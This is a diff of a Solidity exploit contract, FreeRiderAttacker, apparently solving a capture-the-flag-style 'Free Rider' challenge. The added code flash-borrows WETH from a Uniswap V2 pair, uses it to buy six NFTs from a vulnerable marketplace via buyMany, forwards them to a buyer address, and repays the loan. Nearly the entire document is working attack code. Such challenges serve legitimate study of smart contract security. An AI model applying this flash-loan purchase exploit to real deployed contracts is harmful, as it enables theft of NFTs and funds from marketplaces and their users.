@@ -3,6 +3,9 @@ pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+import "../free-rider/FreeRiderNFTMarketplace.sol";
 import "hardhat/console.sol";
 
 interface IERC20 {
@@ -53,22 +56,36 @@ interface IUniswapV2Pair {
     ) external;
 }
 
-contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee {
+contract FreeRiderAttacker is
+    ReentrancyGuard,
+    IERC721Receiver,
+    IUniswapV2Callee
+{
     IUniswapV2Pair immutable pair;
     IWETH immutable weth;
-    IERC721 immutable token;
+    IERC721 immutable nft;
+    FreeRiderNFTMarketplace immutable marketplace;
+    address immutable buyer;
 
-    constructor(IUniswapV2Pair _pair, IWETH _weth, IERC721 _nftToken) {
+    constructor(
+        IUniswapV2Pair _pair,
+        IWETH _weth,
+        IERC721 _nftToken,
+        FreeRiderNFTMarketplace _marketplace,
+        address _buyer
+    ) {
         pair = _pair;
         weth = _weth;
-        token = _nftToken;
+        nft = _nftToken;
+        marketplace = _marketplace;
+        buyer = _buyer;
     }
 
     function flashSwap(uint amount) external {
         bytes memory data = abi.encode(weth, amount);
         pair.swap(amount, 0, address(this), data);
 
-        console.log("flashSwap successufll");
+        console.log("flashSwap successful");
     }
 
     function uniswapV2Call(
@@ -76,30 +93,50 @@ contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee {
         uint amount0,
         uint amount1,
         bytes calldata data
-    ) external override {
-        require(msg.sender == address(pair), "Not Pair");
+    ) external override nonReentrant {
+        require(msg.sender == address(pair), "Not pair");
+        require(sender == address(this), "Not sender");
 
         (address decodedAddress, uint amountDecoded) = abi.decode(
             data,
             (address, uint)
         );
-        require(decodedAddress == address(weth), "v2call not weth");
+        require(amountDecoded == amount0, "Amount0 NOK");
+        require(decodedAddress == address(weth), "Not weth");
+
+        /*-------- make use of flash loaned weth; buy nfts --------*/
+        uint256 nftCount = 6;
+        uint256[] memory nftIds = new uint256[](nftCount);
+
+        for (uint i = 0; i < nftCount; i++) {
+            nftIds[i] = uint256(i);
+        }
+        // exchange weth to eth
+        weth.withdraw(amount0);
+        marketplace.buyMany{value: amount0}(nftIds);
+
+        //send nfts to buyer
+        for (uint i = 0; i < nftCount; i++) {
+            nft.safeTransferFrom(address(this), address(buyer), i);
+        }
+
+        /*-------- payback the loan --------*/
+        // exchange eth to weth
+        weth.deposit{value: amount0}();
         uint paybackAmount = (amount0 * 1000) / 997 + 1;
-        uint wethBalance = weth.balanceOf(address(this));
 
         bool sent = weth.transfer(address(pair), paybackAmount);
         require(sent, "weth not payed back");
-
-        //amount0 is weth
-        //amount1 is token and its value should be == 0
     }
 
     function onERC721Received(
         address,
         address,
-        uint256 _tokenId,
+        uint256,
         bytes memory
-    ) external override returns (bytes4) {}
+    ) external override returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
 
     receive() external payable {}
 }
